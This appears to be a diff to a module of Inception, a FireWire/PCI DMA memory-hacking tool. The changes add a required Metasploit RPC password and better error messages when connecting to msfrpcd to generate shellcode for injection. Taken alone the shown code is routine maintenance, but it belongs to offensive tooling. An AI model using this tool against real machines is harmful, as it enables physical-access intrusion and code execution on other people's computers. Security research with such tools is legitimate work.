@@ -1,8 +1,8 @@
 '''
 Inception - a FireWire physical memory manipulation and hacking tool exploiting
-IEEE 1394 SBP-2 DMA.
+PCI-based and IEEE 1394 SBP-2 DMA.
 
-Copyright (C) 2011-2013  Carsten Maartmann-Moe
+Copyright (C) 2011-2014  Carsten Maartmann-Moe
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -222,6 +222,8 @@ def set_exitfunc(payload, exitfunk):
 
 
 def run(opts, memspace):
+    if not opts.msfpw:
+        raise InceptionException('You must specify a password (--msfpw)')
 
     # Warning
     term.warn('This module currently only work as a proof-of-concept against '
@@ -237,11 +239,15 @@ def run(opts, memspace):
         except Exception as e:
             raise InceptionException(e)
     else:
-        # Connect to msf and generate shellcode
+        # Connect to MSF RPD daemon and have it generate our shellcode
         try:
             client = MsfRpcClient(opts.msfpw)
         except MsfRpcError as e:
             raise InceptionException('Could not connect to Metasploit: {0}'
+                                     .format(e))
+        except Exception as e:
+            raise InceptionException('Could not connect to Metasploit, '
+                                     'is the `msfrpcd` daemon running? ({0})'
                                      .format(e))
 
         name = term.poll('What MSF payload do you want to use?',
